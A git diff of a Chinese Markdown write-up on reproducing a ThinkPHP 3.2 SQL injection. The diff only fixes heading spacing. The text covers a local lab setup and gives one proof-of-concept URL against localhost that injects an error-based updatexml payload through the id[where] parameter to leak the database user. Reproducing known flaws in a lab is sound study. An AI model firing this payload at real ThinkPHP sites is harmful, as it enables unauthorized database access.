@@ -1,9 +1,9 @@
-#Thinkphp3.2 SQL注入分析
+# Thinkphp3.2 SQL注入分析
 
 thinkphp框架的漏洞还是相对好复现一点的，我个人觉得相关的资料也很多，并且漏洞年代也有一段时间了，比较适合像我这种小菜来理解，分析。
 相关的代码我已经推到这个项目里面去了。关于环境部署和复现过程我简单记录一下。
 
-##环境部署
+## 环境部署
 我这里利用的是MAMP集成环境，如果在windows上，大家也可以使用WAMP。
 直接把代码放到根目录下即可。
 关于数据库要建立一个thinkphp的数据库。里面建立一张user表，3个字段，分别是id,username,password。
@@ -11,7 +11,7 @@ thinkphp框架的漏洞还是相对好复现一点的，我个人觉得相关的
 
 关于建库建表的命令我就不说了，直接百度就有。
 
-##复现
+## 复现
 poc:http://localhost:8888/tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
 
 ![](http://tiaotiaolong.cn-bj.ufileos.com/blog19-02.jpg)
